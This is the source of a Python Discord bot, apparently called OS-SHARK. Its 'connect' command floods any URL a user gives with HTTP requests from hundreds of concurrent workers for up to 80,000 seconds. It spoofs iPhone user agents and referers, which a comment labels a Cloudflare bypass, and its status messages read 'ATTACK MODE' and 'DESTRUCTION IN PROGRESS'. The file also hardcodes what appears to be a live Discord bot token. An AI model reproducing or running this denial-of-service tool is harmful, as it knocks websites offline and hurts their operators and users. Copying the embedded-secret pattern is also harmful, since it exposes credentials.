import discord
from discord.ext import commands
import time
import asyncio
import aiohttp
import psutil
import random
from discord import Color

TOKEN = "MTMyNTM5MTk3OTkxMTA1NzQxOA.Gu2zuV.8BhEOhgwH6sKRjUkfQzVf8gwyr50gepZ6hh-2s"

# iPhone User Agents
IPHONE_USER_AGENTS = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/93.0.4577.63 Mobile/15E148 Safari/604.1"
]

# Referer list for Cloudflare bypass
REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.amazon.com/"
]

def get_actual_memory():
    """Returns actual RAM usage in MB"""
    return f"{psutil.Process().memory_full_info().uss / 1024 / 1024:.2f} MB"

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!sg ", intents=intents)

class RequestWorker:
    def __init__(self, session, target):
        self.session = session
        self.target = target
    
    async def make_request(self):
        headers = {
            "User-Agent": random.choice(IPHONE_USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": "max-age=0",
            "TE": "Trailers",
            "Referer": random.choice(REFERERS)
        }
        
        try:
            start_time = time.time()
            async with self.session.get(self.target, headers=headers, timeout=10) as response:
                elapsed = time.time() - start_time
                success = 200 <= response.status <= 299  # Only 200-299 status codes count as success
                return {
                    "status": response.status,
                    "time": elapsed,
                    "success": success
                }
        except Exception as e:
            return {
                "status": str(e),
                "time": 0,
                "success": False
            }

@bot.command()
async def connect(ctx, target: str, time_limit: int = 60):
    """High-performance connection testing with aggressive styling"""
    if time_limit > 80000:
        await ctx.send(embed=discord.Embed(
            title="❌ ERROR",
            description="Maximum time limit is 80000 seconds",
            color=0xFF0000
        ))
        return
    
    if not target.startswith(('http://', 'https://')):
        target = f"http://{target}"
    
    try:
        # Performance tracking
        start_time = time.time()
        end_time = start_time + time_limit
        stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'latency': 0,
            'last_rps': 0,
            'peak_rps': 0,
            'last_update': time.time(),
            'last_embed_update': 0
        }
        
        # Create optimized session
        connector = aiohttp.TCPConnector(
            force_close=True,
            enable_cleanup_closed=True,
            limit=0,
            ttl_dns_cache=300
        )
        
        # Initial embed with purple color
        embed_color = Color.purple()
        embed = discord.Embed(
            title="💢 OS-SHARK CONNECT (ATTACK MODE) 💢",
            color=embed_color,
            description=f"**TARGET**: `{target}`\n**DURATION**: `{time_limit}s`\n**STATUS**: `INITIALIZING`"
        )
        embed.add_field(name="💣 REQUEST STATS", 
                       value="```Requests: 0\nSuccess: 0\nFailed: 0\nRPS: 0.0```", 
                       inline=True)
        embed.add_field(name="⚡ PERFORMANCE", 
                       value=f"```Avg Latency: 0.0ms\nPeak RPS: 0.0```", 
                       inline=True)
        embed.add_field(name="🖥️ SYSTEM", 
                       value=f"```RAM: {get_actual_memory()}\nCPU: {psutil.cpu_percent()}%```", 
                       inline=False)
        embed.set_footer(text="T.ME/STSVKINGDOM | 💀 DESTRUCTION IN PROGRESS 💀")
        message = await ctx.send(embed=embed)
        
        # Main attack loop
        async with aiohttp.ClientSession(connector=connector) as session:
            workers = [RequestWorker(session, target) for _ in range(500)]
            
            while time.time() < end_time:
                # Dynamic batch size based on CPU
                cpu_load = psutil.cpu_percent()
                batch_size = min(500, int(1000 * (1 - cpu_load/100)))
                
                # Process batch
                tasks = []
                for worker in random.sample(workers, batch_size):
                    tasks.append(worker.make_request())
                
                results = await asyncio.gather(*tasks)
                
                # Update stats
                for result in results:
                    stats['total'] += 1
                    if result['success']:
                        stats['success'] += 1
                        stats['latency'] += result['time']
                    else:
                        stats['failed'] += 1
                
                # Calculate RPS
                current_time = time.time()
                time_elapsed = current_time - stats['last_update']
                if time_elapsed >= 1.0:
                    stats['last_rps'] = (stats['total'] - (stats['total'] - len(results))) / time_elapsed
                    stats['peak_rps'] = max(stats['peak_rps'], stats['last_rps'])
                    stats['last_update'] = current_time
                
                # Update embed every 2-4 seconds
                if current_time - stats['last_embed_update'] >= random.uniform(2, 4):
                    stats['last_embed_update'] = current_time
                    avg_latency = (stats['latency'] / stats['success']) * 1000 if stats['success'] > 0 else 0
                    
                    # Rotate embed color between purple shades
                    colors = [Color.dark_purple(), Color.purple(), Color.magenta()]
                    embed_color = random.choice(colors)
                    
                    embed = discord.Embed(
                        title="💢 OS-SHARK CONNECT 💢",
                        color=embed_color,
                        description=f"**TARGET**: `{target}`\n**DURATION**: `{int(end_time - time.time())}s REMAINING`\n**STATUS**: `ATTACKING`"
                    )
                    embed.add_field(name="💣 REQUEST STATS", 
                                   value=f"```Requests: {stats['total']}\nSuccess: {stats['success']}\nFailed: {stats['failed']}\nRPS: {stats['last_rps']:.1f}```", 
                                   inline=True)
                    embed.add_field(name="⚡ PERFORMANCE", 
                                   value=f"```Avg Latency: {avg_latency:.2f}ms\nPeak RPS: {stats['peak_rps']:.1f}```", 
                                   inline=True)
                    embed.add_field(name="🖥️ SYSTEM", 
                                   value=f"```RAM: {get_actual_memory()}\nCPU: {cpu_load}%```", 
                                   inline=False)
                    embed.set_footer(text="T.ME/STSVKINGDOM | ? OS-SHARK 2023 ?")
                    await message.edit(embed=embed)
                
                # Dynamic delay based on CPU usage
                delay = max(0.05, (cpu_load / 100) * 0.2)
                await asyncio.sleep(delay)
        
        # Final stats
        total_time = time.time() - start_time
        avg_rps = stats['total'] / total_time if total_time > 0 else 0
        avg_latency = (stats['latency'] / stats['success']) * 1000 if stats['success'] > 0 else 0
        
        # Final embed (dark purple for completion)
        embed = discord.Embed(
            title="? ATTACK COMPLETED ?",
            color=Color.dark_purple(),
            description=f"**TARGET**: `{target}`\n**TOTAL DURATION**: `{time_limit}s`"
        )
        embed.add_field(name="💣 FINAL STATS", 
                       value=f"```Total Requests: {stats['total']}\nSuccessful: {stats['success']}\nFailed: {stats['failed']}```", 
                       inline=True)
        embed.add_field(name="⚡ PERFORMANCE", 
                       value=f"```Avg RPS: {avg_rps:.1f}\nPeak RPS: {stats['peak_rps']:.1f}\nAvg Latency: {avg_latency:.2f}ms```", 
                       inline=True)
        embed.add_field(name="🖥️ RESOURCE USAGE", 
                       value=f"```Max RAM: {get_actual_memory()}\nMax CPU: {psutil.cpu_percent()}%```", 
                       inline=False)
        embed.set_footer(text="T.ME/STSVKINGDOM | ? OS-SHARK 2023 ?")
        
        await message.edit(embed=embed)
        
    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="🔴 ATTACK FAILED",
            description=f"```{str(e)}```",
            color=0xFF0000
        ))

bot.run(TOKEN)